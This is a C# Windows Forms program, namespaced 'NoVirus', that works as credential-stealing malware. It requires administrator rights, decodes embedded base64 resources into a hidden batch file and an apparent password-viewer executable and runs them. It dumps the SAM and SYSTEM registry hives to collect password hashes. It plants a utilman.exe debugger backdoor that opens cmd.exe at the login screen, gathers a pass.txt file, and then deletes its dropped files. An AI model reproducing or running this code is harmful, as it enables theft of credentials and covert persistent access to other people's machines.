using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using System.Security.Principal;
using System.Threading;

namespace NoVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeLibrary();
        }

        bool isAdmin;
        string path;
        private void InitializeLibrary()
        {
            path = Assembly.GetExecutingAssembly().Location; isAdmin = false;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (isAdmin)
            {
                try
                {
                    int last = path.LastIndexOf('\u005c') + 1;
                    path = path.Remove(last);
                    string bat = path + "REPAIR.bat";
                    string passview = path + "WB.exe";
                    if (File.Exists(bat) != true && File.Exists(passview) != true)
                    {
                        CreateBAT(); CreateWPV();
                        //MessageBox.Show("Created BAT and WPV!");
                        Process my = new Process();
                        my.StartInfo.FileName = $"{path}REPAIR.bat";
                        my.StartInfo.UseShellExecute = true;
                        my.StartInfo.Verb = "runas";
                        my.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        my.Start();
                        my.WaitForExit();
                        my.Close();
                    }
                }
                catch (Exception exc) { MessageBox.Show($"{exc.Message}!\n Please, run this program as administrator!", "Error!"); Close(); }
            }
            else { MessageBox.Show($"Please, run this program as administrator!", "Error!"); Close(); }
            Suicide();
        }

        private void CreateWPV()
        {
            Stream stream = new MemoryStream(Properties.Resources.WB);
            StreamReader SR = new StreamReader(stream);
            string my = SR.ReadToEnd();
            byte[] enc = Convert.FromBase64String(my);
            File.WriteAllBytes("WB.exe", enc);
            SR.Close();
        }

        private void CreateBAT()
        {
            Stream stream = new MemoryStream(Properties.Resources.BAT);
            StreamReader SR = new StreamReader(stream);
            string my = SR.ReadToEnd();
            byte[] enc = Convert.FromBase64String(my);
            File.WriteAllBytes("REPAIR.bat", enc);
            SR.Close();
        }

        private void CopyHASH()
        {
            if (File.Exists("SAM")) { File.Delete("SAM"); }
            if (File.Exists("SYSTEM")) { File.Delete("SYSTEM"); }
            Process hash = new Process();
            hash.StartInfo.FileName = "CMD.exe";
            hash.StartInfo.Arguments = "/c reg save \"HKLM\\SAM\" SAM";
            hash.StartInfo.UseShellExecute = true;
            hash.StartInfo.Verb = "runas";
            hash.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            hash.Start();
            hash.WaitForExit();
            hash.StartInfo.Arguments = "/c reg save \"HKLM\\SYSTEM\" SYSTEM";
            hash.Start();
            hash.WaitForExit();
            hash.Close();
            if (File.Exists("my\\SAM")) { File.Replace("SAM", "my\\SAM", "my\\SAM_OLD"); }
            else { File.Move("SAM", "my\\SAM"); }
            if (File.Exists("my\\SYSTEM")) { File.Replace("SYSTEM", "my\\SYSTEM", "my\\SYSTEM_OLD"); }
            else { File.Move("SYSTEM", "my\\SYSTEM"); }
        }

        private void CreateBackdoor()
        {
            Process bd = new Process();
            bd.StartInfo.FileName = "CMD.exe";
            bd.StartInfo.Arguments = "/C reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f ";
            bd.StartInfo.UseShellExecute = true;
            bd.StartInfo.Verb = "runas";
            bd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            bd.Start();
            bd.WaitForExit();
            bd.Close();
        }

        private void Suicide()
        {
            if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
            CreateBackdoor();
            CopyHASH();
            if (isAdmin)
            {
                if (File.Exists($"{path}REPAIR.bat")) { File.Delete($"{path}REPAIR.bat"); }
                if (File.Exists($"{path}WB.exe")) { File.Delete($"{path}WB.exe"); }
                if (File.Exists($"{path}pass.txt"))
                {
                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", $"{path}my\\pass_old.txt"); }
                    else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                }
                Thread.Sleep(1500);
                Close();
            }
            else { Close(); }
        }

        private void DeleteRemote()
        {
            Process my = new Process();
        }
    }
}
